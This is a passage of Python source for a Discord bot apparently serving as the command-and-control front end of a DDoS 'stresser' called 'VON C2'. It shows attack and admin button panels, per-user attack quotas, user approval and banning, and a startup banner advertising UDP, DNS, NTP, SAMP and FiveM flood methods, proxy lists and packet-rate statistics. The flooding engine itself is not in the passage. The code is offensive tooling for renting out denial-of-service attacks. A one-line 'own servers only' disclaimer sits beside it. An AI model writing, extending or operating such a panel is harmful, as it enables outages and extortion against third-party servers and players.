        await interaction.response.send_message(embed=embed, ephemeral=True)
    
    @discord.ui.button(label="👤 PROFILE", style=discord.ButtonStyle.secondary, emoji="👤", row=2)
    async def profile_btn(self, interaction: discord.Interaction, button: Button):
        remaining = ATTACK_LIMITS.get(self.user_id, 0)
        embed = discord.Embed(title=f"👤 {interaction.user.name}'s PROFILE", color=0x00FF00)
        embed.set_thumbnail(url=interaction.user.avatar.url if interaction.user.avatar else None)
        embed.add_field(name="🆔 ID", value=f"`{self.user_id}`", inline=True)
        embed.add_field(name="💀 Attacks Left", value=f"`{remaining}`", inline=True)
        embed.add_field(name="✅ Status", value="`Approved`" if self.user_id in APPROVED_USERS else "`Pending`", inline=True)
        embed.add_field(name="📱 Device ID", value=f"`{stresser.get_device_id()}`", inline=True)
        await interaction.response.send_message(embed=embed, ephemeral=True)
    
    @discord.ui.button(label="⏹️ STOP", style=discord.ButtonStyle.danger, emoji="⏹️", row=2)
    async def stop_btn(self, interaction: discord.Interaction, button: Button):
        stresser.stop_all()
        await interaction.response.send_message("⏹️ ALL ATTACKS STOPPED!", ephemeral=True)

class AdminPanel(View):
    def __init__(self):
        super().__init__(timeout=None)
    
    @discord.ui.button(label="📋 PENDING", style=discord.ButtonStyle.primary, emoji="📋", row=0)
    async def pending_btn(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != OWNER_ID:
            await interaction.response.send_message("❌ Only owner!", ephemeral=True)
            return
        if not PENDING_USERS:
            await interaction.response.send_message("📭 No pending requests!", ephemeral=True)
            return
        for uid in PENDING_USERS:
            try:
                user = await interaction.client.fetch_user(int(uid))
                embed = discord.Embed(title="📋 PENDING REQUEST", color=0xFF6600)
                embed.add_field(name="User", value=f"{user.name} (`{uid}`)", inline=True)
                await interaction.response.send(embed=embed, view=ApprovalView(uid, user.name), ephemeral=True)
                await asyncio.sleep(0.5)
            except:
                pass
    
    @discord.ui.button(label="👥 USERS", style=discord.ButtonStyle.secondary, emoji="👥", row=0)
    async def users_btn(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != OWNER_ID:
            await interaction.response.send_message("❌ Only owner!", ephemeral=True)
            return
        if not APPROVED_USERS:
            await interaction.response.send_message("👥 No approved users!", ephemeral=True)
            return
        users_list = ""
        for uid in list(APPROVED_USERS)[:20]:
            limit = ATTACK_LIMITS.get(uid, DEFAULT_ATTACK_LIMIT)
            try:
                user = await interaction.client.fetch_user(int(uid))
                users_list += f"• {user.name} - {limit} attacks left\n"
            except:
                users_list += f"• {uid} - {limit} attacks left\n"
        embed = discord.Embed(title="👥 APPROVED USERS", description=users_list, color=0x00BFFF)
        embed.set_footer(text=f"Total: {len(APPROVED_USERS)} users")
        await interaction.response.send_message(embed=embed, ephemeral=True)
    
    @discord.ui.button(label="🏆 STATS", style=discord.ButtonStyle.secondary, emoji="🏆", row=0)
    async def stats_btn(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != OWNER_ID:
            await interaction.response.send_message("❌ Only owner!", ephemeral=True)
            return
        embed = discord.Embed(title="🏆 SYSTEM STATISTICS", color=0xFFD700)
        embed.add_field(name="📦 Total Packets", value=f"{STATS['total_packets']:,}", inline=True)
        embed.add_field(name="🎯 Total Attacks", value=f"{STATS['total_attacks']}", inline=True)
        embed.add_field(name="🏆 Peak Speed", value=f"{STATS['peak_speed']:,.0f} pps", inline=True)
        embed.add_field(name="👥 Approved Users", value=str(len(APPROVED_USERS)), inline=True)
        embed.add_field(name="📝 Pending Users", value=str(len(PENDING_USERS)), inline=True)
        embed.add_field(name="🔨 Banned Users", value=str(len(BANNED_USERS)), inline=True)
        embed.add_field(name="⚡ Active Attacks", value=f"{stresser.get_active_count()}", inline=True)
        embed.add_field(name="📱 Active Devices", value=f"{stresser.get_active_sessions()}", inline=True)
        await interaction.response.send_message(embed=embed, ephemeral=True)
    
    @discord.ui.button(label="⚙️ GIVE", style=discord.ButtonStyle.secondary, emoji="⚙️", row=1)
    async def give_btn(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != OWNER_ID:
            await interaction.response.send_message("❌ Only owner!", ephemeral=True)
            return
        modal = Modal(title="⚙️ GIVE ATTACKS")
        user_id_input = TextInput(label="User ID", placeholder="Enter user ID", required=True)
        amount_input = TextInput(label="Number of attacks", placeholder="Enter number", required=True)
        modal.add_item(user_id_input)
        modal.add_item(amount_input)
        async def on_submit(interaction):
            try:
                target_id = user_id_input.value
                amount = int(amount_input.value)
                if target_id in ATTACK_LIMITS:
                    ATTACK_LIMITS[target_id] += amount
                else:
                    ATTACK_LIMITS[target_id] = amount
                save_data()
                await interaction.response.send_message(f"✅ Added {amount} attacks to `{target_id}`!", ephemeral=True)
                try:
                    user = await interaction.client.fetch_user(int(target_id))
                    if user:
                        await user.send(f"🎁 You got {amount} additional attacks!")
                except:
                    pass
            except:
                await interaction.response.send_message("❌ Invalid input!", ephemeral=True)
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)
    
    @discord.ui.button(label="🔨 BAN", style=discord.ButtonStyle.danger, emoji="🔨", row=1)
    async def ban_btn(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != OWNER_ID:
            await interaction.response.send_message("❌ Only owner!", ephemeral=True)
            return
        modal = Modal(title="🔨 BAN USER")
        user_id_input = TextInput(label="User ID", placeholder="Enter user ID", required=True)
        reason_input = TextInput(label="Reason", placeholder="Ban reason", required=True)
        modal.add_item(user_id_input)
        modal.add_item(reason_input)
        async def on_submit(interaction):
            target_id = user_id_input.value
            reason = reason_input.value
            BANNED_USERS.add(target_id)
            if target_id in APPROVED_USERS:
                APPROVED_USERS.remove(target_id)
            if target_id in PENDING_USERS:
                PENDING_USERS.remove(target_id)
            save_data()
            await interaction.response.send_message(f"🔨 Banned `{target_id}`!\nReason: {reason}", ephemeral=True)
            try:
                user = await interaction.client.fetch_user(int(target_id))
                if user:
                    await user.send(f"🔨 You have been banned!\nReason: {reason}")
            except:
                pass
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)

# ============================================
# BOT SETUP
# ============================================
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_message(message):
    global OWNER_ID
    if message.author.bot:
        return
    if isinstance(message.channel, discord.DMChannel) and not OWNER_ID:
        OWNER_ID = str(message.author.id)
        APPROVED_USERS.add(OWNER_ID)
        ATTACK_LIMITS[OWNER_ID] = -1
        save_data()
        embed = discord.Embed(title="👑 YOU ARE THE OWNER!", color=0x00FF00)
        embed.add_field(name="Welcome", value="You have full control!", inline=False)
        embed.add_field(name="Commands", value="Just use the buttons below!", inline=False)
        await message.channel.send(embed=embed)
        print(f"✅ Owner: {message.author.name}")
        return
    await bot.process_commands(message)
    if isinstance(message.channel, discord.DMChannel):
        if str(message.author.id) == OWNER_ID:
            await message.channel.send("👑 **OWNER PANEL**", view=AdminPanel())
            await message.channel.send("💀 **ATTACK PANEL**", view=AttackPanel(str(message.author.id)))
        elif str(message.author.id) in APPROVED_USERS:
            remaining = ATTACK_LIMITS.get(str(message.author.id), 0)
            embed = discord.Embed(title="💀 VON ATTACK PANEL", description=f"```\nAttacks left: {remaining}\nPeak Speed: {stresser.peak_speed:,.0f} pps\nDevice: {stresser.get_device_id()}\n```", color=0xFF0000)
            await message.channel.send(embed=embed, view=AttackPanel(str(message.author.id)))
        else:
            await message.channel.send("🔐 **WELCOME TO VON C2**\nChoose an option:", view=MainMenuView())

@bot.event
async def on_ready():
    print(f"""
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                    ✅ VON C2 ULTIMATE SYSTEM ONLINE! ✅                                          ║
╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣
║ 🤖 Bot: {bot.user}                                                                                               ║
║ 💻 CPU: {CPU_CORES} Cores | 🔥 Threads: {MAX_THREADS:,}                                                          ║
║ 🎭 Proxies: {len(PROXY_LIST):,} | 📦 Packets: {len(ALL_PACKETS):,}                                               ║
║ 🎮 Methods: SAMP | FiveM | UDP | DNS | NTP | ULTIMATE                                                           ║
║ 👥 Approved Users: {len(APPROVED_USERS)} | 📝 Pending: {len(PENDING_USERS)}                                      ║
║ 👑 Owner: {OWNER_ID if OWNER_ID else 'Not set - DM me'}                                                         ║
║ 🏆 Peak Speed: {stresser.peak_speed:,.0f} pps | 🚀 Peak Bandwidth: {stresser.peak_bandwidth:.2f} Gbps           ║
║ 📱 Device ID: {stresser.get_device_id()} | 📊 Active Sessions: {stresser.get_active_sessions()}                  ║
╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣
║ 💀 First DM = OWNER | 🔐 Register ONCE - Use on ANY device!                                                      ║
║ 🌐 Auto sync across all devices | Each device has unique ID                                                     ║
║ ⚠️ USE ONLY ON YOUR OWN SERVERS!                                                                                ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
    """)

if __name__ == "__main__":
    print("\n🚀 Starting VON C2 ULTIMATE SYSTEM...")
    print("💀 First DM = OWNER")
    print("🔐 Register ONCE - Use on ANY device!")
    print("📱 Each device has unique ID")
    print("⚡ Auto sync across 10,000+ devices")
    bot.run(TOKEN)
